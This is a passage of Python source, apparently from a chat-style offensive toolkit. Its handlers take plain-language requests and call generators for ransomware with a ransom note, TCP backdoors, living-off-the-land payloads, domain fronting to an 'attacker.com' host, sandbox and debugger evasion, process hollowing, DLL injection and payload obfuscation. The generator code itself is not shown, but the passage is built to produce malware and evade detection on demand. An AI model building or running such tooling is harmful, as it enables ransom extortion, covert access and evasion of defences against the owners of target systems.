            return "Specify front and real domains. Example: 'Create domain fronting payload with front domain example.com and real domain attacker.com'"
        
        # Living Off The Land
        elif "lotl" in request_lower or "living off" in request_lower:
            # Extract command
            if "command" in request_lower:
                cmd_start = request_lower.find("command") + 8
                command = request[cmd_start:].strip()
            else:
                command = "whoami"
            
            result = self.advanced_payloads.create_living_off_the_land_payload(command)
            return f"Created LOLBAS payload: {result['file']}. Command: {result['command']}. {result['warning']}"
        
        # Ransomware
        elif "ransomware" in request_lower:
            import re
            dir_match = re.search(r'dir[ectory]?\s+([^\s]+)', request_lower)
            target_dir = dir_match.group(1) if dir_match else "./test"
            
            note = "Your files have been encrypted. Pay ransom to decrypt."
            result = self.advanced_payloads.create_ransomware_payload(target_dir, note)
            return f"Created ransomware payload: {result['file']}. Target: {result['target']}. {result['warning']}"
        
        # Backdoor
        elif "backdoor" in request_lower:
            import re
            port_match = re.search(r'port\s+(\d+)', request_lower)
            port = int(port_match.group(1)) if port_match else 4444
            
            result = self.advanced_payloads.create_backdoor_payload("tcp", port)
            return f"Created backdoor payload: {result['file']}. Port: {result['port']}. {result['warning']}"
        
        return "Advanced payload types: memory-only, multistage, self-destruct, encrypted communication, domain fronting, LOLBAS, ransomware, backdoor"
    
    def _handle_anti_detection(self, request: str) -> str:
        """Handle anti-detection requests"""
        request_lower = request.lower()
        
        # Check for VM/debugger/sandbox detection
        if "detect vm" in request_lower or "check vm" in request_lower:
            result = self.anti_detection.detect_vm()
            return f"VM Detection: {'Detected' if result['is_vm'] else 'Not detected'}. Indicators: {', '.join(result['indicators']) if result['indicators'] else 'None'}"
        
        elif "detect debugger" in request_lower:
            result = self.anti_detection.detect_debugger()
            return f"Debugger: {'Detected' if result['debugger_detected'] else 'Not detected'}. Methods: {', '.join(result['methods']) if result['methods'] else 'None'}"
        
        elif "detect sandbox" in request_lower:
            result = self.anti_detection.detect_sandbox()
            return f"Sandbox: {'Detected' if result['sandbox_detected'] else 'Not detected'}. Indicators: {', '.join(result['indicators']) if result['indicators'] else 'None'}"
        
        # Create anti-detection payload
        elif "anti detection" in request_lower or "anti detect" in request_lower:
            # Extract payload path
            import re
            path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
            if path_match:
                payload_path = path_match.group()
                result = self.anti_detection.create_anti_detection_payload(payload_path)
                return f"Created anti-detection payload: {result['file']}. Features: {', '.join(result['features'])}. {result['warning']}"
            return "Specify payload path. Example: 'Create anti-detection version of keylogger.py'"
        
        return "Anti-detection commands: detect VM, detect debugger, detect sandbox, create anti-detection payload"
    
    def _handle_process_injection(self, request: str) -> str:
        """Handle process injection requests"""
        request_lower = request.lower()
        
        if "process hollow" in request_lower or "hollow" in request_lower:
            # Extract target process
            target = "notepad.exe"  # Default
            if "notepad" in request_lower:
                target = "notepad.exe"
            elif "calc" in request_lower:
                target = "calc.exe"
            
            result = self.process_injection.create_process_hollowing(target)
            if result.get("error"):
                return f"Error: {result['error']}"
            return f"Created process hollowing payload: {result['file']}. Target: {result['target']}. {result['warning']}"
        
        elif "dll inject" in request_lower:
            result = self.process_injection.create_dll_injection("1234", "payload.dll")
            if result.get("error"):
                return f"Error: {result['error']}"
            return f"Created DLL injection payload: {result['file']}. {result['warning']}"
        
        return "Process injection: process hollowing, DLL injection"
    
    def _handle_advanced_obfuscation(self, request: str) -> str:
        """Handle advanced obfuscation requests"""
        import re
        path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
        if not path_match:
            return "Specify payload path. Example: 'Fully obfuscate keylogger.py'"
        
        payload_path = path_match.group()
        if not os.path.exists(payload_path):
            return f"Payload not found: {payload_path}"
        
        result = self.advanced_obfuscator.create_fully_obfuscated(payload_path)
        return f"Created fully obfuscated payload: {result['obfuscated']}. Layers: {result['layers']}. {result['warning']}"
